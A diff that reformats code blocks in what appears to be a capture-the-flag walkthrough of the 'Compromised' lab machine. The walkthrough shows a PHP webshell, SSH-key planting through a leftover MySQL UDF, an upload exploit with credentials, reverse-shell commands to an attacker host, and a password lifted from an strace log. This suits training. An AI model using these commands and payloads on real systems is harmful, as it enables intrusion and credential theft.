@@ -341,7 +341,7 @@ root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --da
 
 I’ll add some code to my PHP that will run DB queries:
 
-```sploit = """<?php
+```sploit = <?php
 if (isset($_REQUEST['file'])) { 
     echo file_get_contents($_REQUEST['file']);
 } 
@@ -362,33 +362,39 @@ if (isset($_REQUEST['db'])) {
 }
 
 ?>
-"""```
+```
 
 It works:
 
-```root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select @@version'
-5.7.30-0ubuntu0.18.04.1```
+```
+root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select @@version'
+5.7.30-0ubuntu0.18.04.1
+```
 
 ### exec_cmd
 
 Eventually I checked the mysql.func table, which stores information about user-defined functions created with the CREATE FUNCTION UDF statement. The headers are Name, Ret, dl, type:
 
-```root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select * from mysql.func;'
-exec_cmd 0 libmysql.so function```
+```
+root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select * from mysql.func;'
+exec_cmd 0 libmysql.so function
+```
 
 exec_cmd isn’t a standard MySQL function, but rather a user defined function (UDF), perhaps left behind by the attacker. Just knowing the name, it’s worth a shot to run something. Command output doesn’t seem to come back (seems like that’s an issue with my shell, as exec_cmd does return data, as I’ll show in the next section), but it does seem to run, as running ping -c 5 takes about five seconds to return.
 
 ### Shell
 Just like with the webshell, nothing that sends traffic back to my host seems to work. But I can guess that since the user had a shell added, perhaps there’s a .ssh directory. And it works:
 
-```root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode "db=SELECT exec_cmd('echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\" >> /var/lib/mysql/.ssh/authorized_keys');"
+```
+root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode "db=SELECT exec_cmd('echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\" >> /var/lib/mysql/.ssh/authorized_keys');"
 root@kali# ssh -i ~/keys/ed25519_gen mysql@10.10.10.207
 The authenticity of host '10.10.10.207 (10.10.10.207)' can't be established.
 ECDSA key fingerprint is SHA256:eYvjeWOH3lYrex1T0a/7BQsAv9L4YbZem1T0BGWjtVE.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.10.207' (ECDSA) to the list of known hosts.
 Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.4
-mysql@compromised:~$```
+mysql@compromised:~$
+```
 
 ## 2. Bypass disable_functions
 
@@ -397,44 +403,54 @@ I wrote about Chankro a while back and how it can bypass disable_functions in PH
 
 I’ll update the exploit script to read in and send the shell from the GitHub:
 
-```with open("exploit.php", "r") as f:
+```bash
+with open("exploit.php", "r") as f:
     exploit = f.read()
 
 files = {
         'vqmod': (rand + ".php", exploit, "application/xml"),
         'token':one,
         'upload':(None,"Upload")
-    }```
+    }
+```
 
 On running it, it prints the output of uname:
 
-```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
+```
+root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
 Shell => http://10.10.10.207/shop/admin/../vqmod/xml/PMBX7.php?c=id
-Linux compromised 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux```
+Linux compromised 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+```
 
 That’s the output of uname -a.
 
 ### Webshell
 I’ll replace uname with a payload that runs based on the request:
 
-```#pwn("uname -a");
-pwn($_REQUEST['c']);```
+```
+#pwn("uname -a");
+pwn($_REQUEST['c']);
+```
 
 I used c because the exploit POC uses c in it’s webshell. When I run this, it works:
 
-```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
+```
+root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
 Shell => http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php?c=id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 ### No Reverse Shell
 
 I wasn’t able to get a full shell from this. It seems that perhaps the firewall is not allowing traffic out? All of these either hung or returned instantly:
 
-```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'"
+```
+root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'"
 ^C
 root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=wget http://10.10.14.4:443"
 ^C
-root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=nc 10.10.14.4 443"```
+root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=nc 10.10.14.4 443"
+```
 
 I can pull the iptables rules:
 
@@ -490,7 +506,8 @@ Still, I can write an SSH key just like above.
 
 In mysql’s homedir, there’s a file that jumps out as unusual:
 
-```mysql@compromised:~$ ls -l
+```
+mysql@compromised:~$ ls -l
 total 189260
 -rw-r----- 1 mysql mysql       56 May  8  2020 auto.cnf
 -rw------- 1 mysql mysql     1680 May  8  2020 ca-key.pem
@@ -511,39 +528,50 @@ drwxr-x--- 2 mysql mysql     4096 May  8  2020 performance_schema
 -rw-r--r-- 1 mysql mysql     1112 May  8  2020 server-cert.pem
 -rw------- 1 mysql mysql     1680 May  8  2020 server-key.pem
 -r--r----- 1 root  mysql   787180 May 13  2020 strace-log.dat
-drwxr-x--- 2 mysql mysql    12288 May  8  2020 sys```
+drwxr-x--- 2 mysql mysql    12288 May  8  2020 sys
+```
 
 strace-log.dat is owned by root, and readable by the mysql group. Every other file in this folder (except the 0-byte debian-5.7.flag is owned by mysql.) strace is a program designed to intercept and display or log system calls made by another processes. It can also be used by a hacker as a make-shift keylogger.
 
 Running a script like LinPEAS will also highlight this file as interesting:
 
-```[+] Readable files belonging to root and readable by me but not world readable
--r--r----- 1 root mysql 787180 May 13  2020 /var/lib/mysql/strace-log.dat.```
+```
+[+] Readable files belonging to root and readable by me but not world readable
+-r--r----- 1 root mysql 787180 May 13  2020 /var/lib/mysql/strace-log.dat.
+```
 
 On doing some searching through the file, there’s a place where it’s recording a mysql run where the password is passed on the command line:
 
-```22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0```
+```
+22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
+```
 
 ## su
 
 That password works for the user on the box, sysadmin:
 
-```mysql@compromised:~$ su sysadmin -
+```
+mysql@compromised:~$ su sysadmin -
 Password: 
 bash: cannot set terminal process group (-1): Inappropriate ioctl for device
 bash: no job control in this shell
-sysadmin@compromised:/var/lib/mysql$```
+sysadmin@compromised:/var/lib/mysql$
+```
 
 And I can grab user.txt:
 
-```sysadmin@compromised:~$ cat user.txt
-8fa1e68a************************```
+```
+sysadmin@compromised:~$ cat user.txt
+8fa1e68a************************
+```
 
 This password also works for SSH:
 
-```root@kali# sshpass -p '3*NLJE32I$Fe' ssh sysadmin@10.10.10.207
+```
+root@kali# sshpass -p '3*NLJE32I$Fe' ssh sysadmin@10.10.10.207
 Last login: Wed Jan 20 18:37:38 2021 from 10.10.14.4
-sysadmin@compromised:~$```
+sysadmin@compromised:~$
+```
 
 
 
